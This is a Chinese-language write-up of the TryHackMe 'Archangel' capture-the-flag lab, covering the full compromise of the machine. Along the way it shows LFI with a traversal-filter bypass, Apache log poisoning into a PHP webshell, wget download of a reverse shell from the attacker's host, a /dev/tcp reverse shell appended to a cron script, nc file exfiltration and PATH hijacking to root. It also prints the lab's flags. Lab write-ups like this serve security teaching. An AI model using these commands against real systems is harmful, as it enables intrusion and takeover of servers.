# Archangel Writeup
> url : https://tryhackme.com/room/archangel

IP : 10.10.163.60

## Recon
- 起手式，掃 Port `rustscan -a 10.10.163.60`
	- ![](https://i.imgur.com/DkyiPwB.png)
	- 80 , 22
- 掃路徑 `python3 dirsearch.py -u http://10.10.163.60/ -e all`
	- ![](https://i.imgur.com/VzsbcR0.png)

- 觀察網頁首頁，發現裡面有 `/flag`
	- ![](https://i.imgur.com/ZEE1LMm.png)
	- 點進去後 ......
	- ![](https://i.imgur.com/xjq9ave.png)
	- 幹...
	- 用 curl 觀察
		- ![](https://i.imgur.com/t50dIAx.png)
		- 他會自動跳轉到這邊 https://www.youtube.com/watch?v=dQw4w9WgXcQ
	
## Dfferent Hostname
- 題目提示 : `Find a different hostname` 
	- ![](https://i.imgur.com/qUlq0LJ.png)
 	- 可以觀察 `mafialive.thm`

- `sudo vim /etc/hosts`
	- 加上這一行 `10.10.163.60 mafialive.thm`
	- 接下來到 http://mafialive.thm/
	- ![](https://i.imgur.com/KYuqXWR.png)
	- 就拿到了 flag
- 再掃一次路徑`python3 dirsearch.py -u http://mafialive.thm/ -e all`
	- `http://mafialive.thm/robots.txt`
		- ![](https://i.imgur.com/sAPv2Gu.png)
		- `/test.php`
			- http://mafialive.thm/test.php
			- ![](https://i.imgur.com/N9Ec4bZ.png)

- 觀察按下按鈕後的網址
	- http://mafialive.thm/test.php?view=/var/www/html/development_testing/mrrobot.php
	- ![](https://i.imgur.com/XPlzuRQ.png)
	- 感覺很明顯可以 LFI
		- 嘗試 Base64 Payload 
			- http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/mrrobot.php
			- 成功 !!
			- 觀察 test.php 原始碼
				- http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php

			```php
			<!DOCTYPE HTML>
			<html>

			<head>
				<title>INCLUDE</title>
				<h1>Test Page. Not to be Deployed</h1>

				</button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
					<?php

						//FLAG: thm{explo1t1ng_lf1}

						function containsStr($str, $substr) {
							return strpos($str, $substr) !== false;
						}
						if(isset($_GET["view"])){
						if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
							include $_GET['view'];
						}else{

							echo 'Sorry, Thats not allowed';
						}
					}
					?>
				</div>
			</body>
			```
			- 又撿到一個 flag `thm{explo1t1ng_lf1}`
			- 觀察原始碼發現，網址裡不能出現 `../..` 且一定要出現 `/var/www/html/development_testing`
				- `../..` 可以用 `.././..` 繞
			- 測試 `curl http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././.././.././.././.././etc/passwd`
			- 成功!!
			- ![](https://i.imgur.com/zGil911.png)

- 來看 apache access log
	- `/var/log/apache2/access.log`
	- `curl http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././.././.././.././.././var/log/apache2/access.log`
	- 成功 !!![](https://i.imgur.com/WYHb6LH.png)
	- 往上拉發現所有的 host log 都在這邊，所以可以直接針對 ip 來做 nc 寫 php
		- `nc 10.10.163.60 80`
		- `GET /?<?php phpinfo(); ?>`
		- ![](https://i.imgur.com/MiuNtLX.png)
- 再回去看一次 access log
	- http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././.././.././.././.././var/log/apache2/access.log
	- 成功出現 phpinfo !!
	- ![](https://i.imgur.com/XqQ4scJ.png)
- 寫入 webshell
	- `nc 10.10.163.60 80`
	- `GET /<?php system($_GET[A]); ?>`
		- ![](https://i.imgur.com/wGnyObt.png)
		- http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././.././.././.././.././var/log/apache2/access.log&A=ls
			- ![](https://i.imgur.com/JHfk4lv.png)
- 下載 reverse shell
	- `http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././.././.././.././.././var/log/apache2/access.log&B=wget 10.13.21.55:8000/s -O /tmp/s`
		- ![](https://i.imgur.com/GDeKuQ2.png)
		- 本地準備監聽 `nc -vlk 7877`
		- 執行 shell `http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././.././.././.././.././var/log/apache2/access.log&B=bash%20/tmp/s`
		- 成功接上
		- ![](https://i.imgur.com/JkQjkHV.png)
- 使用 python 讓 terminal 變漂亮
	- `
python3 -c 'import pty; pty.spawn("/bin/bash")'`

- 找 user flag
	- ![](https://i.imgur.com/voiBmAr.png)
	- `thm{lf1_t0_rc3_1s_tr1cky}`
- 找到使用者資料夾內有 passwordbackup
	- ![](https://i.imgur.com/LKIcTu2.png)
	- 幹...再一次
	- 等......等等，不會吧
	- 該不會那個網址真 TM 是他的密碼 ?__?
	- ![](https://i.imgur.com/rngMQwS.png)
		- 好的，好險不是
- 使用 Linpeas 掃
	- `wget 10.13.21.55:8000/linpeas.sh`
	- `bash linpeas.sh`
		- 找到一個可疑的 cron job
			- ![](https://i.imgur.com/9QYLgx9.png)
		- 發現 這個 cron 會使用 `archangel` 來執行，而且我們對 `/opt/helloworld.sh`有讀寫權限
		- ![](https://i.imgur.com/YYauluN.png)
		- 寫入 reverse shell
		- `echo "bash -c 'bash -i >& /dev/tcp/10.13.21.55/7878 0>&1'" >> /opt/helloworld.sh`
- 等待一分鐘後，自動接上!!
	- ![](https://i.imgur.com/ZQ4fZmN.png)
	- ![](https://i.imgur.com/D3bK7Rc.png)
	- 找到 flag
		- `thm{h0r1zont4l_pr1v1l3g3_2sc4ll4t10n_us1ng_cr0n}`
- 觀察使用者中的 secret 資料夾中
	- 有一個 backup 檔案有 suid
		- ![](https://i.imgur.com/omAJJqD.png)
- 透過 nc 把檔案傳出來
	- 監聽端 `nc -l -p 1234 > meow`
	- 發送端 `nc 10.13.21.55 1234 < backup`
- 哼!這種等級的 reverse，連 ida 都不用開，我們用 r2 就好ㄌ
	- `r2 meow`
	- `aaa`
	- `s main`
	- `VV`
	- ![](https://i.imgur.com/P6euu23.png)
	- 可以看到他會用 system call 一個 cp
	- 而 cp 沒有寫絕對路徑，所以可以用 path 進行誤導

## 誤導 path
- 在家目錄創一個 fakepath
	- `mkdir fakepath`
	- `export PATH=/home/archangel/fakepath:$PATH` 
- 準備一個假的 cp 檔案
	- `echo '#!/bin/bash' > cp`
	- `echo "/bin/bash" >> cp`
	- `chmod +x cp`
- 執行 backup
	- `./backup`
- 取得 root 權限 !!
	- ![](https://i.imgur.com/h6rVFzI.png)
		- `thm{p4th_v4r1abl3_expl01tat1ion_f0r_v3rt1c4l_pr1v1l3g3_3sc4ll4t10n}
`